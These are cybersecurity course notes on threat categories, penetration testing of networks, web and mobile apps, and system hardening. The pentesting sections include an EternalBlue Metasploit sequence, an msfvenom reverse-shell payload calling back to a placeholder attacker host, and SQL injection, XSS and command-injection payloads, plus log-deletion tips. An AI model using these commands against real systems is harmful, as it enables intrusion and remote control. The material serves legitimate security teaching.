# CYBERSECURITY COURSE NOTES

# 1: ASSESS CYBER THREATS

## 1.1 Introduction to Cyber Threats

Cyber threats refer to potential attacks on digital assets such as networks, systems, applications, and data. These threats can originate from various actors and exploit a range of vulnerabilities.

## 1.2 Categories of Cyber Threats

* **Malware**: Malicious software including viruses, worms, Trojans, ransomware.
* **Phishing**: Deceptive emails or messages that trick users into revealing confidential information.
* **Denial-of-Service (DoS) and Distributed DoS (DDoS)**: Overloading a system with traffic to make it unavailable.
* **Man-in-the-Middle (MITM)**: Interception and manipulation of communications.
* **Zero-Day Attacks**: Exploitation of unknown vulnerabilities before patches are available.

## 1.3 Threat Actors

* **Script Kiddies**: Inexperienced individuals using pre-made tools.
* **Hacktivists**: Motivated by political or social causes.
* **Cybercriminals**: Aim to make financial profit through illegal activities.
* **Nation-State Actors**: State-sponsored groups conducting cyber espionage or sabotage.
* **Insiders**: Employees or contractors who misuse internal access.

## 1.4 Threat Intelligence

* **Indicators of Compromise (IOCs)**: IP addresses, file hashes, domains linked to threats.
* **Threat Intelligence Sources**:

  * AlienVault OTX
  * IBM X-Force Exchange
  * MITRE ATT\&CK Framework

## 1.5 Risk Assessment and Threat Modeling

* **Asset Identification**: Determine what needs to be protected.
* **Vulnerability Identification**: Detect weaknesses in systems.
* **Threat Identification**: Assess potential threats and their likelihood.
* **Impact Analysis**: Evaluate potential damage of each threat.
* **Risk Matrix**: Used to prioritize mitigation efforts.

---

# 2: NETWORK PENETRATION TESTING

## 2.1 Overview

Network penetration testing simulates attacks to discover vulnerabilities in network infrastructure, allowing defenders to patch weaknesses before attackers exploit them.

## 2.2 Phases of Network Penetration Testing
1. **Reconnaissance**: Gather target info.
   - Passive: Public data (e.g., Whois, Google Dorks).
   - Active: Direct interaction (e.g., port scanning).
   - Tools: Maltego, Recon-ng, Shodan.
2. **Scanning/Enumeration**: Detect live hosts, ports, and services.
   - Types: Port, network, vulnerability, application, wireless scanning.
   - Tools: Nmap, Nessus, OWASP ZAP, Wireshark.
   - Use `Nmap` for port and service scanning:

     ```bash
     nmap -sS -sV -T4 target_ip
     ```
     
3. **Gaining Access**: Exploit vulnerabilities to access systems.
   - Techniques: SQL injection, password cracking, social engineering.
   - Tools: Metasploit, SQLMap, Hydra.
   - Example:

     ```bash
     use exploit/windows/smb/ms17_010_eternalblue
     set RHOSTS target_ip
     run
     ```
4. **Maintaining Access**: Ensure persistent access via backdoors.
   - Techniques: Rootkits, Trojans, privilege escalation.
   - Tools: Meterpreter, Mimikatz, Cobalt Strike.
5. **Covering Tracks**: Hide evidence (simulated for ethical hacking).
   - Techniques: Log deletion, timestamp changes.
   - Tools: CCleaner, log manipulation scripts.
6. **Reporting**: Document findings and remediation steps.
   - Content: Vulnerabilities, exploits, proof-of-concept, fixes.

**Example**:
- Reconnaissance reveals a company’s IP range via Shodan.
- Scanning with Nmap finds open ports, followed by SQL injection exploitation using SQLMap.
- A report suggests patching and firewall rules.


## 2.3 Payload Generation with `msfvenom`

`msfvenom` is used to create custom payloads for exploitation.

**Example: Generate a reverse shell payload for Windows:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -o shell.exe
```

**Common formats:**

* `exe`: Windows binary
* `apk`: Android application
* `elf`: Linux binary
* `asp`, `jsp`, `php`: Web shells

## 2.4 Common Network Attacks

* **ARP Spoofing**: Use `arpspoof` to intercept traffic
* **DNS Poisoning**: Redirect domains to malicious IPs
* **MITM Attacks**: Use `Ettercap`, `Bettercap`
* **Password Sniffing**: Capture credentials using `Wireshark`

---

# 3: WEB APPLICATION PENETRATION TESTING

## 3.1 Web Technologies Basics

* HTTP/HTTPS protocols
* Request/response lifecycle
* Sessions, cookies, headers

## 3.2 OWASP Top 10 Vulnerabilities (2021)

1. Broken Access Control
2. Cryptographic Failures
3. Injection (SQL, Command)
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable Components
7. Identification and Authentication Failures
8. Software and Data Integrity Failures
9. Security Logging and Monitoring Failures
10. Server-Side Request Forgery (SSRF)

## 3.3 Testing Methodology

* **Manual testing**: Inspect source code, input fields, hidden parameters
* **Automated tools**:

  * `Burp Suite` (interception proxy)
  * `OWASP ZAP` (open-source scanner)
  * `Nikto` (web server scanner)

## 3.4 SQL Injection Example

Test payload:

```sql
' OR 1=1 --
```

Tool: `sqlmap`

```
sqlmap -u "http://example.com/index.php?id=1" --dbs
```

## 3.5 Cross-Site Scripting (XSS)

Payload:

```html
<script>alert('XSS')</script>
```

## 3.6 Command Injection Example

Payload:

```bash
; ls -la
```

---

# 4: MOBILE APPLICATION PENETRATION TESTING

## 4.1 Mobile Architecture Basics

* Android: APK, Java/Kotlin, Dalvik VM
* iOS: IPA, Objective-C/Swift, sandboxing

## 4.2 Threat Vectors

* Insecure data storage
* Weak authentication
* Code injection
* Inter-process communication flaws

## 4.3 Testing Tools

* **MobSF**: Static and dynamic analysis
* **APKTool**: Decompile APKs
* **Frida**: Hook and modify runtime functions
* **Drozer**: Android pentest framework
* **Objection**: Runtime mobile testing

## 4.4 Practical Examples

* **Reverse engineer APK**:

  ```
  apktool d app.apk
  ```
* **Check for hardcoded secrets** in smali code or `strings.xml`
* **Bypass root/jailbreak detection** with Frida hooks

---

# 5: SYSTEM SECURITY HARDENING

## 5.1 Introduction

System hardening reduces vulnerabilities by tightening security controls at the OS and application levels.

## 5.2 Operating System Hardening (Linux/Windows)

* Disable unused services
* Remove unnecessary packages
* Apply security patches regularly
* Configure audit policies

## 5.3 Access Control

* Implement Role-Based Access Control (RBAC)
* Enforce least privilege
* Secure administrator/root accounts

## 5.4 Firewall Configuration

* Linux:

  ```
  sudo ufw enable
  sudo ufw allow ssh
  sudo ufw deny 23
  ```
* Windows:

  * Use Windows Defender Firewall GUI or `netsh advfirewall` CLI

## 5.5 Intrusion Detection and Prevention Systems

* **IDS Tools**: Snort, Suricata
* **Log Monitoring**: OSSEC, Wazuh, Graylog

## 5.6 Patch Management

* Use WSUS (Windows) or unattended-upgrades (Linux)
* Automate updates where possible

## 5.7 Disk and Data Security

* Full disk encryption: BitLocker (Windows), LUKS (Linux)
* Data backup and restore planning
* Secure file permissions
